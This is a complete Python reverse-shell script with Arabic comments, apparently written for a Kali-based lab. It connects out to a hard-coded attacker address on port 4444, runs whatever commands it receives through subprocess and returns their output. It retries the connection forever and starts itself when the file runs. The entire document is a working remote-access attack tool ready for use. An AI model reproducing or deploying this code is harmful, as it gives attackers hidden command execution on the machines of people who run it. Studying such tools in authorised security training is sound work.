import socket
import subprocess

def reverse_shell():
    # استبدل IP بالـ IP الخاص بجهازك
    HOST = '192.168.1.10'  # عنوان IP لجهاز Kali
    PORT = 4444  # المنفذ المفتوح في جهاز Kali

    while True:
        try:
            # إنشاء اتصال socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            # إرسال تنبيه عند الاتصال
            s.send(b"Connection Established!\n")

            while True:
                # استقبال الأوامر
                cmd = s.recv(1024).decode("utf-8")
                if cmd.lower() == "exit":
                    break

                # تنفيذ الأمر
                output = subprocess.getoutput(cmd)

                # إرسال النتيجة
                if output:
                    s.send(output.encode("utf-8"))
                else:
                    s.send(b"No output\n")
        except Exception as e:
            # في حالة حدوث خطأ، حاول إعادة الاتصال
            s.close()

# تشغيل الـ reverse shell
reverse_shell()
